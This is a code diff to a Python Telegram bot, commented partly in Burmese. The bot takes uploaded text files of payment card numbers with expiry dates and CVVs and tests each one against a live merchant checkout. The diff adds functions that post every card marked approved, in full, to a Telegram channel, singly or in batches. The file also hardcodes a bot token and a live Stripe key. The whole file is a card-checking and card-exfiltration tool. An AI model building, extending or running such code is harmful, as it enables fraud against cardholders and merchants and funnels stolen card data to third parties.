@@ -3,8 +3,10 @@ import asyncio
 import json
 import random
 import os
-import time
-from telegram import Update
+import signal
+import sys
+from datetime import datetime
+from telegram import Update, Bot
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 from dotenv import load_dotenv
 
@@ -13,9 +15,15 @@ load_dotenv()
 
 DOMAIN = os.getenv("DOMAIN", "https://dainte.com")
 PK = os.getenv("STRIPE_PK", "pk_live_51F0CDkINGBagf8ROVbhXA43bHPn9cGEHEO55TN2mfNGYsbv2DAPuv6K0LoVywNJKNuzFZ4xGw94nVElyYg1Aniaf00QDrdzPhf")
+CHANNEL_ID = os.getenv("CHANNEL_ID", "-1003673366048")  # သို့မဟုတ် channel ID (-100xxxxxx)
+ADMIN_IDS = os.getenv("ADMIN_IDS", "").split(",")  # Admin user IDs (comma separated)
+
+# Global variables
+bot_running = True
+current_task = None
+approved_cards_list = []  # Store approved cards for channel posting
 
 # ===================== ORIGINAL CARD CHECKING FUNCTIONS =====================
-
 def parseX(data, start, end):
     try:
         star = data.index(start) + len(start)
@@ -46,12 +54,15 @@ async def make_request(
     except Exception as e:
         return None, 0
 
-async def ppc(cards, card_num, total_cards):
-    """မူရင်း card checking function"""
+async def ppc(cards, card_num, total_cards, user_id=None):
+    """Modified to accept user_id parameter"""
     cc, mon, year, cvv = cards.split("|")
     year = year[-2:]
     cc = cc.replace(" ", "")
-
+    
+    # Store original for return
+    original_card = f"{cc}|{mon}|{year}|{cvv}"
+    
     cookies = {
         '_gcl_au': '1.1.1390503211.1765951324',
         'sbjs_migrations': '1418474375998%3D1',
@@ -203,7 +214,22 @@ async def ppc(cards, card_num, total_cards):
             try:
                 result_data = json.loads(req3)
                 if result_data.get('success'):
-                    return f"✅ ᴀᴘᴘʀᴏᴠᴇᴅ 🔥 [{card_num}/{total_cards}]\n𝗖𝗖: {cc}|{mon}|{year}|{cvv}"
+                    result_message = f"✅ ᴀᴘᴘʀᴏᴠᴇᴅ 🔥 [{card_num}/{total_cards}]\n𝗖𝗖: {cc}|{mon}|{year}|{cvv}"
+                    
+                    # ✅ Store approved card for channel posting
+                    card_info = {
+                        "card": original_card,
+                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                        "user_id": user_id,
+                        "card_num": card_num,
+                        "total_cards": total_cards
+                    }
+                    
+                    # Add to approved cards list
+                    global approved_cards_list
+                    approved_cards_list.append(card_info)
+                    
+                    return result_message
                 else:
                     # Extract error message from JSON response
                     error_msg = "Unknown error"
@@ -221,17 +247,143 @@ async def ppc(cards, card_num, total_cards):
         
         return f"❌ ᴅᴇᴄʟɪɴᴇᴅ ❌ [{card_num}/{total_cards}]\n𝗖𝗖: {cc}|{mon}|{year}|{cvv}\n𝗡𝗼 𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗲 𝗳𝗿𝗼𝗺 𝘀𝗲𝗿𝘃𝗲𝗿"
 
+# ===================== CHANNEL POSTING FUNCTIONS =====================
+
+async def post_to_channel(bot: Bot, card_info):
+    """Post approved card to Telegram channel"""
+    try:
+        message = (
+            f"🎉 **NEW APPROVED CARD** 🎉\n\n"
+            f"💳 `{card_info['card']}`\n"
+            f"⏰ {card_info['timestamp']}\n"
+            f"📊 Progress: {card_info['card_num']}/{card_info['total_cards']}\n"
+            f"👤 Checked by user"
+        )
+        
+        await bot.send_message(
+            chat_id=CHANNEL_ID,
+            text=message,
+            parse_mode="Markdown"
+        )
+        print(f"✅ Approved card posted to channel: {card_info['card']}")
+        return True
+    except Exception as e:
+        print(f"❌ Failed to post to channel: {e}")
+        return False
+
+async def post_batch_to_channel(bot: Bot, cards_batch, batch_number):
+    """Post multiple approved cards as a batch"""
+    try:
+        if not cards_batch:
+            return False
+        
+        batch_message = f"📦 **BATCH #{batch_number} - APPROVED CARDS**\n\n"
+        
+        for i, card_info in enumerate(cards_batch, 1):
+            batch_message += f"{i}. `{card_info['card']}`\n"
+            batch_message += f"   ⏰ {card_info['timestamp']}\n\n"
+        
+        batch_message += f"✅ Total: {len(cards_batch)} cards"
+        
+        await bot.send_message(
+            chat_id=CHANNEL_ID,
+            text=batch_message,
+            parse_mode="Markdown"
+        )
+        print(f"✅ Batch #{batch_number} posted to channel with {len(cards_batch)} cards")
+        return True
+    except Exception as e:
+        print(f"❌ Failed to post batch to channel: {e}")
+        return False
+
+async def check_and_post_approved_cards(bot: Bot, force_post=False):
+    """Check if there are approved cards and post to channel"""
+    global approved_cards_list
+    
+    if not approved_cards_list:
+        return 0
+    
+    posted_count = 0
+    
+    # Post each approved card individually
+    for card_info in approved_cards_list:
+        try:
+            if await post_to_channel(bot, card_info):
+                posted_count += 1
+                await asyncio.sleep(1)  # Delay between posts
+        except Exception as e:
+            print(f"Error posting card: {e}")
+    
+    # Clear the list after posting
+    if posted_count > 0:
+        approved_cards_list = []
+    
+    return posted_count
+
 # ===================== TELEGRAM BOT FUNCTIONS =====================
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /start command"""
+    global bot_running
+    bot_running = True
+    
+    user_id = update.effective_user.id
+    username = update.effective_user.username or "N/A"
+    
     welcome_text = (
-        "send file now"
+        f"Send file now"
     )
     await update.message.reply_text(welcome_text)
+    
+    # Log user start
+    print(f"👤 User @{username} (ID: {user_id}) started the bot")
+
+async def postnow_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /postnow command - Manual posting to channel"""
+    user_id = update.effective_user.id
+    
+    # Check if user is admin
+    if ADMIN_IDS and str(user_id) not in ADMIN_IDS:
+        await update.message.reply_text("❌ ဤ command ကို အသုံးပြုခွင့် မရှိပါ။")
+        return
+    
+    global approved_cards_list
+    
+    if not approved_cards_list:
+        await update.message.reply_text("ℹ️ ယခုအချိန်တွင် approved card မရှိသေးပါ။")
+        return
+    
+    await update.message.reply_text(f"📤 Channel သို့ cards {len(approved_cards_list)} ခု ပို့နေပါသည်...")
+    
+    posted_count = 0
+    bot = context.bot
+    
+    # Post cards in batches of 5
+    for i in range(0, len(approved_cards_list), 5):
+        batch = approved_cards_list[i:i+5]
+        if await post_batch_to_channel(bot, batch, i//5 + 1):
+            posted_count += len(batch)
+        await asyncio.sleep(2)
+    
+    # Clear the list
+    approved_cards_list = []
+    
+    await update.message.reply_text(f"✅ Channel သို့ cards {posted_count} ခု အောင်မြင်စွာ ပို့ပြီးပါပြီ။")
 
 async def handle_text_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle incoming text files"""
+    """Handle incoming text files with channel posting"""
+    global bot_running, current_task, approved_cards_list
+    
+    if not bot_running:
+        await update.message.reply_text(
+            "⚠️ Bot သည် ရပ်တန့်ထားပါသည်။\n"
+            "စစ်ဆေးမှု ပြန်စလိုပါက /start ကိုနှိပ်ပါ။"
+        )
+        return
+    
+    user_id = update.effective_user.id
+    username = update.effective_user.username or "N/A"
+    
     document = update.message.document
     
     # Accept only .txt files
@@ -243,7 +395,7 @@ async def handle_text_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # Download the file
     file = await document.get_file()
-    temp_file = f"temp_{document.file_name}"
+    temp_file = f"temp_{user_id}_{document.file_name}"
     await file.download_to_drive(temp_file)
     
     try:
@@ -256,38 +408,100 @@ async def handle_text_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         
         total_cards = len(cards)
-        await update.message.reply_text(f"🔍 ကတ်အရေအတွက်: {total_cards}\nစစ်ဆေးနေပါ...")
+        await update.message.reply_text(
+            f"🔍 **စစ်ဆေးမှု စတင်ပါပြီ**\n"
+            f"👤 User: @{username}\n"
+            f"📊 ကတ်အရေအတွက်: {total_cards}\n"
+            f"✅ Approved cards များကို channel သို့ auto post လုပ်ပါမည်။\n\n"
+            f"🛑 ရပ်တန့်လိုပါက /stop ကိုနှိပ်ပါ"
+        )
         
         approved = 0
         declined = 0
         results = []
+        checked_cards = 0
+        
+        # Get bot instance for channel posting
+        bot = context.bot
         
         # Check each card
         for i, card in enumerate(cards, 1):
-            result = await ppc(card, i, total_cards)  # ✅ အခု ppc function ကို ခေါ်နိုင်ပါပြီ
+            if not bot_running:
+                await update.message.reply_text(
+                    f"🛑 **စစ်ဆေးမှု ရပ်တန့်လိုက်ပါပြီ!**\n"
+                    f"စစ်ဆေးပြီးသော ကတ်များ: {checked_cards}/{total_cards}\n"
+                    f"✅ Approved: {approved}\n"
+                    f"❌ Declined: {declined}"
+                )
+                break
+            
+            # Check card with user_id parameter
+            current_task = asyncio.create_task(ppc(card, i, total_cards, user_id))
+            try:
+                result = await current_task
+            except asyncio.CancelledError:
+                await update.message.reply_text("🛑 စစ်ဆေးမှု ပြင်ပမှ ရပ်တန့်လိုက်ပါပြီ")
+                break
+            
             results.append(result)
+            checked_cards = i
             
             if "✅ ᴀᴘᴘʀᴏᴠᴇᴅ 🔥" in result:
                 approved += 1
+                
+                # Post approved card to channel immediately
+                if approved_cards_list:
+                    last_card = approved_cards_list[-1]
+                    if await post_to_channel(bot, last_card):
+                        # Remove from list after posting
+                        approved_cards_list.pop()
             else:
                 declined += 1
             
-            # Send results every 10 cards
-            if i % 10 == 0 or i == total_cards:
-                await update.message.reply_text('\n'.join(results[-10:]))
+            # Send progress every 5 cards
+            if i % 5 == 0 or i == total_cards:
+                progress_msg = (
+                    f"📊 **Progress:** {i}/{total_cards}\n"
+                    f"✅ Approved: {approved} | ❌ Declined: {declined}\n"
+                    f"⏳ Continuing..."
+                )
+                await update.message.reply_text(progress_msg)
+                
+                # Send last 3 results
+                await update.message.reply_text('\n'.join(results[-3:]))
             
-            # Delay between cards (as in original code)
-            if i < total_cards:
-                await asyncio.sleep(random.uniform(10, 15))
+            # Delay between cards
+            if i < total_cards and bot_running:
+                delay = random.uniform(10, 15)
+                for _ in range(int(delay)):
+                    if not bot_running:
+                        break
+                    await asyncio.sleep(1)
         
-        # Final summary
-        summary = [
-            "🎯 စစ်ဆေးမှု ပြီးဆုံးပါပြီ",
-            f"✅ အောင်မြင်သော ကတ်များ: {approved}",
-            f"❌ ငြင်းပယ်ခံရသော ကတ်များ: {declined}",
-            f"📊 အောင်မြင်မှုရာခိုင်နှုန်း: {(approved/total_cards)*100:.1f}%"
-        ]
-        await update.message.reply_text('\n'.join(summary))
+        # Final summary if not stopped
+        if bot_running:
+            summary = [
+                "🎯 **စစ်ဆေးမှု ပြီးဆုံးပါပြီ**",
+                f"📊 Total cards checked: {total_cards}",
+                f"✅ Approved cards: {approved}",
+                f"❌ Declined cards: {declined}",
+                f"📈 Success rate: {(approved/total_cards)*100:.1f}%",
+                f"",
+                f"✅ Approved cards have been posted to channel."
+            ]
+            await update.message.reply_text('\n'.join(summary))
+        
+        # Post any remaining approved cards
+        if approved_cards_list:
+            remaining_count = len(approved_cards_list)
+            await update.message.reply_text(
+                f"📤 Posting {remaining_count} approved cards to channel..."
+            )
+            posted = await check_and_post_approved_cards(bot, force_post=True)
+            if posted > 0:
+                await update.message.reply_text(
+                    f"✅ Successfully posted {posted} cards to channel."
+                )
         
     except Exception as e:
         await update.message.reply_text(f"❌ အမှားတစ်ခု ဖြစ်ပွားခဲ့ပါ: {str(e)}")
@@ -295,29 +509,53 @@ async def handle_text_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Clean up temp file
         if os.path.exists(temp_file):
             os.remove(temp_file)
+        
+        # Reset current task
+        current_task = None
 
 # ===================== MAIN FUNCTION =====================
 
 def main():
-    """Start the bot"""
-    # Get Bot Token from environment variable
+    """Start the bot with channel posting feature"""
+    global bot_running
+    
+    # Setup signal handlers
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
+    
+    # Get configuration
     BOT_TOKEN = "8569583023:AAFNKM3mkumVNrpj9uOZ-32fV3sP3nZ0TSo"
     
     if not BOT_TOKEN:
         print("❌ Error: BOT_TOKEN environment variable is not set!")
-        print("Please set it in your .env file or environment variables.")
         return
+    
+    # Check channel configuration
+    if CHANNEL_ID == "@your_channel_username":
+        print("⚠️ Warning: CHANNEL_ID not configured in .env file")
+        print("Approved cards will not be posted to channel.")
     
     # Create application
     app = Application.builder().token(BOT_TOKEN).build()
     
-    # Add command and message handlers
+    # Add command handlers
     app.add_handler(CommandHandler("start", start_command))
+    app.add_handler(CommandHandler("stop", stop_command))
+    app.add_handler(CommandHandler("status", status_command))
+    app.add_handler(CommandHandler("postnow", postnow_command))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_text_file))
     
     # Start the bot
     print("🤖 Bot စတင်နေပါတယ်...")
-    print("Press Ctrl+C to stop")
+    print(f"📢 Channel ID: {CHANNEL_ID}")
+    print("Available commands:")
+    print("  /start    - Start the bot")
+    print("  /stop     - Stop current checking")
+    print("  /status   - Check bot status")
+    print("  /postnow  - Manually post approved cards to channel")
+    print("\n✅ Approved cards will be auto-posted to channel")
+    
+    bot_running = True
     app.run_polling()
 
 if __name__ == "__main__":
